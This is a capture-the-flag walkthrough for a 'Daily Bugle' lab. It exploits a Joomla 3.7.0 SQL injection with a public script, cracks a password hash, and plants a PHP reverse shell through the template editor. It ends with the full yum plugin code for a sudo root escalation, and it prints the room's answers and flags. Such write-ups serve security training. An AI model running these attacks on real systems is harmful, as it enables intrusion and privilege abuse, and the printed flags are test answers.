---
description: Walkthrough (Hard)
---

# Daily Bugle 🔴🔴🔴

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### Task 1 : Deploy

#### Q ) Access the web server, who robbed the bank?

\-> spiderman&#x20;

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption><p>Visit the home page for answer</p></figcaption></figure>

***

### Task 2 : Obtain user and root

#### Q ) What is the Joomla version?

\-> 3.7.0

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

```bash
url + '/administrator/manifests/files/joomla.xml'
```

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

#### Q ) What is Jonah's cracked password?

\-> spiderman123

* use this exploit : [Joomla 3.7.0 Exploit](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py)

```bash
python3 joomlaExploit.py http://10.10.55.97/ 
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

* Found user jonah and password hash.

**Crack the hash**

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**OR**

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

**OR**

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

* [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)  &#x20;

#### Q ) What is the user flag?

\-> 27a260fe3cba712cfdedb1c86d80442e

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.55.97 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
{% endcode %}

* Found [/administrator/](http://10.10.55.97/administrator/)
* Now login with info available

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

* Goto Templates ->  Templates ( sidebar) -> Prostar ( root) -> index.php
* Upload a php reverse shell and visit it.

PHP Reverse Shell : [Here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

* Dont forget to open netcat listener on host machine.
* Found config file while directory busting, lets check it out&#x20;
* /var/www/html/configaration.php

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

* Got  pass : nv5uz9r3ZEDzVjNu

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

* Switch user to jjameson and get flag

#### Q ) What is the root flag?

\-> eec3d53292b1821868266858d7fa6f79

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

* For interactive shell

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

* User can run yum as root without any password so check [GtfoBins](https://gtfobins.github.io/gtfobins/yum/).
* Run this full code in terminal to get root shell.

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>



